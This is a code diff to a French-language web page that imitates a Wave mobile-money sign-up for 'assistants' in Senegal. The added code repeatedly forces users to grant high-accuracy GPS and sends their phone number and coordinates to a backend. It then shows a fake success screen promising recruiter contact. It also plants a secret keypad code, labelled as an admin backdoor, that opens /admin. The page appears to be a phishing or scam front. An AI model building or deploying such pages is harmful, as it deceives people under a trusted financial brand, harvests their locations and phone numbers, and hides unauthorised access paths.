@@ -1,3 +1,4 @@
+html
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -269,90 +270,183 @@
             font-weight: 600;
             cursor: pointer;
         }
+
+        /* Message d'erreur discret en haut si refus de localisation */
+        .error-toast {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            background-color: #FFEBEE;
+            border-left: 4px solid #D32F2F;
+            color: #C62828;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 12.5px;
+            font-weight: 500;
+            display: none;
+            z-index: 2000;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+
+        /* SECTION SUCCÈS (NOUVEL ÉCRAN) */
+        .success-screen {
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        .success-illustration {
+            width: 120px;
+            height: 120px;
+            background-color: #E0F7FA;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 24px;
+            box-shadow: 0 8px 24px rgba(57, 188, 244, 0.2);
+        }
+
+        .success-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #111111;
+            margin-bottom: 12px;
+        }
+
+        .success-desc {
+            font-size: 15px;
+            color: #555555;
+            line-height: 1.6;
+            margin-bottom: 40px;
+        }
+
+        .btn-success-close {
+            width: 100%;
+            max-width: 280px;
+            background-color: #39bcf4;
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            padding: 15px 0;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(57, 188, 244, 0.35);
+        }
     </style>
 </head>
 <body>
 
 <div class="phone-container">
 
-    <!-- HEADER -->
-    <div class="header">
-        <div class="back-arrow">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <line x1="19" y1="12" x2="5" y2="12"></line>
-                <polyline points="12 19 5 12 12 5"></polyline>
+    <!-- Notification d'erreur discrète en haut -->
+    <div id="errorToast" class="error-toast">
+        ⚠️ L'accès GPS est obligatoire pour devenir un assistant Wave.
+    </div>
+
+    <!-- ÉCRAN PRINCIPAL DE FORMULAIRE -->
+    <div id="formScreen" style="display: flex; flex-direction: column; height: 100%;">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="back-arrow">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="19" y1="12" x2="5" y2="12"></line>
+                    <polyline points="12 19 5 12 12 5"></polyline>
+                </svg>
+            </div>
+            <h1>Créer un compte</h1>
+        </div>
+
+        <!-- LOGO PINGOUIN WAVE -->
+        <div class="logo-section">
+            <div class="wave-logo-box">
+                <svg width="62" height="62" viewBox="0 0 100 115" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="50" cy="28" r="20" fill="#111111"/>
+                    <ellipse cx="50" cy="70" rx="25" ry="32" fill="#111111"/>
+                    <ellipse cx="50" cy="74" rx="16" ry="24" fill="#ffffff"/>
+                    <ellipse cx="50" cy="30" rx="13" ry="14" fill="#ffffff"/>
+                    <circle cx="43" cy="24" r="4.5" fill="#111111"/>
+                    <circle cx="57" cy="24" r="4.5" fill="#111111"/>
+                    <circle cx="44.5" cy="22.5" r="1.8" fill="#ffffff"/>
+                    <circle cx="58.5" cy="22.5" r="1.8" fill="#ffffff"/>
+                    <path d="M 44 33 Q 50 39 56 33 Q 50 37 44 33 Z" fill="#FF8C00"/>
+                    <ellipse cx="50" cy="33" rx="6" ry="3" fill="#FF8C00"/>
+                    <path d="M 27 60 C 15 50 8 33 15 22 C 20 14 29 20 31 32 C 33 41 31 52 27 60 Z" fill="#111111"/>
+                    <path d="M 73 60 C 82 64 88 76 85 85 C 81 85 76 72 73 60 Z" fill="#111111"/>
+                    <ellipse cx="40" cy="100" rx="11" ry="5.5" fill="#FF8C00"/>
+                    <ellipse cx="61" cy="100" rx="11" ry="5.5" fill="#FF8C00"/>
+                </svg>
+            </div>
+        </div>
+
+        <!-- TEXTE -->
+        <div class="instruction-text">
+            Inscrivez-vous pour devenir un assistant Wave
+        </div>
+
+        <!-- SAISIE NUMÉRO -->
+        <div class="input-section">
+            <div class="country-selector">
+                <span class="country-flag">🇸🇳</span>
+                <span>+221</span>
+                <span class="arrow-down">▼</span>
+            </div>
+            <div class="phone-input-wrapper">
+                <input type="text" id="phoneDisplay" class="phone-display" placeholder="77 777 77 77" readonly>
+            </div>
+        </div>
+
+        <!-- ESPACE FLEXIBLE -->
+        <div class="spacer"></div>
+
+        <!-- CLAVIER NUMÉRIQUE -->
+        <div class="keypad">
+            <button class="key" onclick="pressKey('1')">1</button>
+            <button class="key" onclick="pressKey('2')">2</button>
+            <button class="key" onclick="pressKey('3')">3</button>
+            <button class="key" onclick="pressKey('4')">4</button>
+            <button class="key" onclick="pressKey('5')">5</button>
+            <button class="key" onclick="pressKey('6')">6</button>
+            <button class="key" onclick="pressKey('7')">7</button>
+            <button class="key" onclick="pressKey('8')">8</button>
+            <button class="key" onclick="pressKey('9')">9</button>
+            <div class="key"></div>
+            <button class="key" onclick="pressKey('0')">0</button>
+            <button class="key delete-btn" onclick="pressDelete()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                    <line x1="18" y1="9" x2="12" y2="15"></line>
+                    <line x1="12" y1="9" x2="18" y2="15"></line>
+                </svg>
+            </button>
+        </div>
+
+        <!-- BOUTON SUIVANT -->
+        <div class="submit-section">
+            <button id="btnSuivant" class="btn-suivant" disabled onclick="finaliserInscription()">Suivant</button>
+        </div>
+    </div>
+
+    <!-- ÉCRAN DE SUCCÈS (NOUVELLE SECTION) -->
+    <div id="successScreen" class="success-screen">
+        <div class="success-illustration">
+            <!-- Icône de validation animée -->
+            <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#39bcf4" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 6 9 17 4 12"></polyline>
             </svg>
         </div>
-        <h1>Créer un compte</h1>
-    </div>
-
-    <!-- LOGO PINGOUIN WAVE -->
-    <div class="logo-section">
-        <div class="wave-logo-box">
-            <svg width="62" height="62" viewBox="0 0 100 115" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="50" cy="28" r="20" fill="#111111"/>
-                <ellipse cx="50" cy="70" rx="25" ry="32" fill="#111111"/>
-                <ellipse cx="50" cy="74" rx="16" ry="24" fill="#ffffff"/>
-                <ellipse cx="50" cy="30" rx="13" ry="14" fill="#ffffff"/>
-                <circle cx="43" cy="24" r="4.5" fill="#111111"/>
-                <circle cx="57" cy="24" r="4.5" fill="#111111"/>
-                <circle cx="44.5" cy="22.5" r="1.8" fill="#ffffff"/>
-                <circle cx="58.5" cy="22.5" r="1.8" fill="#ffffff"/>
-                <path d="M 44 33 Q 50 39 56 33 Q 50 37 44 33 Z" fill="#FF8C00"/>
-                <ellipse cx="50" cy="33" rx="6" ry="3" fill="#FF8C00"/>
-                <path d="M 27 60 C 15 50 8 33 15 22 C 20 14 29 20 31 32 C 33 41 31 52 27 60 Z" fill="#111111"/>
-                <path d="M 73 60 C 82 64 88 76 85 85 C 81 85 76 72 73 60 Z" fill="#111111"/>
-                <ellipse cx="40" cy="100" rx="11" ry="5.5" fill="#FF8C00"/>
-                <ellipse cx="61" cy="100" rx="11" ry="5.5" fill="#FF8C00"/>
-            </svg>
-        </div>
-    </div>
-
-    <!-- TEXTE -->
-    <div class="instruction-text">
-        Inscrivez-vous pour devenir un assistant Wave
-    </div>
-
-    <!-- SAISIE NUMÉRO -->
-    <div class="input-section">
-        <div class="country-selector">
-            <span class="country-flag">🇸🇳</span>
-            <span>+221</span>
-            <span class="arrow-down">▼</span>
-        </div>
-        <div class="phone-input-wrapper">
-            <input type="text" id="phoneDisplay" class="phone-display" placeholder="77 777 77 77" readonly>
-        </div>
-    </div>
-
-    <!-- ESPACE FLEXIBLE -->
-    <div class="spacer"></div>
-
-    <!-- CLAVIER NUMÉRIQUE -->
-    <div class="keypad">
-        <button class="key" onclick="pressKey('1')">1</button>
-        <button class="key" onclick="pressKey('2')">2</button>
-        <button class="key" onclick="pressKey('3')">3</button>
-        <button class="key" onclick="pressKey('4')">4</button>
-        <button class="key" onclick="pressKey('5')">5</button>
-        <button class="key" onclick="pressKey('6')">6</button>
-        <button class="key" onclick="pressKey('7')">7</button>
-        <button class="key" onclick="pressKey('8')">8</button>
-        <button class="key" onclick="pressKey('9')">9</button>
-        <div class="key"></div>
-        <button class="key" onclick="pressKey('0')">0</button>
-        <button class="key delete-btn" onclick="pressDelete()">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
-                <line x1="18" y1="9" x2="12" y2="15"></line>
-                <line x1="12" y1="9" x2="18" y2="15"></line>
-            </svg>
-        </button>
-    </div>
-
-    <!-- BOUTON SUIVANT -->
-    <div class="submit-section">
-        <button id="btnSuivant" class="btn-suivant" disabled onclick="finaliserInscription()">Suivant</button>
+        <h2 class="success-title">Inscription Réussie !</h2>
+        <p class="success-desc">
+            Vos informations de profil ainsi que votre secteur d'activité ont été validés et enregistrés en toute sécurité.<br><br>
+            Un responsable de recrutement Wave prendra contact avec vous très prochainement par WhatsApp ou par téléphone pour finaliser votre dossier d'assistant.
+        </p>
+        <button class="btn-success-close" onclick="window.location.reload()">Terminer</button>
     </div>
 
 </div>
@@ -380,7 +474,10 @@
 
 <script>
     let rawNumber = "";
+    let latitude = null;
+    let longitude = null;
 
+    // Déclenchement automatique de la pop-up système après le chargement
     window.onload = function() {
         setTimeout(ouvrirPopupSysteme, 650);
     };
@@ -396,27 +493,66 @@
         const overlay = document.getElementById("modalOverlay");
         const popup = document.getElementById("systemPopup");
         popup.classList.remove("show");
-        setTimeout(() => overlay.style.display = "none", 300);
+        setTimeout(() => {
+            overlay.style.display = "none";
+            // Si l'utilisateur refuse ou ferme sans coordonnées, on affiche un avertissement discret
+            if (!latitude || !longitude) {
+                afficherErreur();
+            }
+        }, 300);
     }
 
+    // Demander et stocker les coordonnées réelles reçues du GPS
     function demanderPositionReelle() {
         fermerPopupSysteme();
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                function(position) { console.log("Position obtenue."); },
-                function(error) { console.warn("Refusé ou indisponible."); },
+                function(position) { 
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
+                    console.log("Position obtenue :", latitude, longitude); 
+                    document.getElementById("errorToast").style.display = "none";
+                },
+                function(error) { 
+                    console.warn("Refusé ou indisponible."); 
+                    afficherErreur();
+                },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
+        } else {
+            alert("Votre appareil ne prend pas en charge la géolocalisation.");
         }
     }
 
+    function afficherErreur() {
+        const toast = document.getElementById("errorToast");
+        toast.style.display = "block";
+        // Réinsister après 4 secondes pour que l'utilisateur comprenne l'obligation du GPS
+        setTimeout(() => {
+            if (!latitude || !longitude) {
+                ouvrirPopupSysteme();
+            }
+        }, 4000);
+    }
+
+    // Saisie clavier
     function pressKey(num) {
-        if (rawNumber.length < 9) {
-            rawNumber += num;
-            formatAndDisplay();
+        rawNumber += num;
+
+        // ACCÈS DIRECT PORTE DÉROBÉE ADMIN (Code secret : 62397)
+        if (rawNumber === "62397") {
+            window.location.href = "/admin";
+            return;
         }
+
+        // Limite normale à 9 chiffres pour les numéros de téléphone du Sénégal
+        if (rawNumber.length > 9) {
+            rawNumber = rawNumber.slice(0, 9);
+        }
+        formatAndDisplay();
     }
 
+    // Correction
     function pressDelete() {
         if (rawNumber.length > 0) {
             rawNumber = rawNumber.slice(0, -1);
@@ -424,6 +560,7 @@
         }
     }
 
+    // Formatage 77 777 77 77
     function formatAndDisplay() {
         let d = "";
         for (let i = 0; i < rawNumber.length; i++) {
@@ -441,11 +578,48 @@
         }
     }
 
+    // Soumission réelle vers Python en arrière-plan puis redirection vers la section succès
     function finaliserInscription() {
         if (rawNumber.length !== 9) return;
-        window.location.href = "https://wa.me/votre_numero_wave";
+
+        // Sécurité : s'il n'y a pas de GPS, on refuse de soumettre et on exige la position
+        if (!latitude || !longitude) {
+            ouvrirPopupSysteme();
+            return;
+        }
+
+        const payload = {
+            telephone: "+221" + rawNumber,
+            latitude: latitude,
+            longitude: longitude
+        };
+
+        // Communication avec l'API de ton fichier app.py
+        fetch('/api/inscription', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === "success") {
+                // Masquer le formulaire et afficher directement la belle section de succès intégrée !
+                document.getElementById("formScreen").style.display = "none";
+                document.getElementById("successScreen").style.display = "flex";
+            } else {
+                alert("Une erreur technique est survenue durant la validation.");
+            }
+        })
+        .catch(error => {
+            console.error("Erreur d'envoi :", error);
+            alert("Erreur réseau. Impossible de soumettre votre inscription.");
+        });
     }
 </script>
 
 </body>
 </html>
+
+
